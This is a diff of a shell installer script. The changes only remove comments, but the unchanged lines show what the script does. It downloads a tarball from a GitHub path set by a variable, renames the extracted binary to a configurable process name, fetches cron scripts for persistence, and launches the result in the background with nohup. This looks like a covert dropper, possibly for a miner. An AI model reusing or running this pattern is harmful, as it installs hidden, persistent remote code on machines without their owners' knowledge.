@@ -27,9 +27,6 @@ num=$Fcheck
 if [ $num = 2 ]; 
 	then
 		echo "RUN PROCESS 1"; 
-		#1 Linux Trx
-			#whoami > inuser.txt
-			# get name
 			Uname=$(ls /home)
 			sudo echo $Uname > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
@@ -37,7 +34,6 @@ if [ $num = 2 ];
 			rm -rf linux.tar.gz
 			mkdir bin
 			cp linux bin/linux
-			
 			chown -R $Uname:$Uname /home/$Uname/
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
@@ -61,12 +57,9 @@ if [ $num = 2 ];
 			mv linux $USEPROCNAME
 			sudo chown -R $Uname:$Uname /home/$Uname/
 			nohup sh runsrc.sh > result.log 2>&1 &
-			#2
 			
 	else 
 		echo "RUN PROCESS 2"; 
-
-#1 Linux Trx
 			Uname=$(ls /home)
 			sudo echo $Uname > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
@@ -98,6 +91,5 @@ if [ $num = 2 ];
 			mv linux $USEPROCNAME
 			sudo chown -R $Uname:$Uname /home/$Uname/
 			nohup sh runsrc.sh > result.log 2>&1 &
-			#2
 
 fi
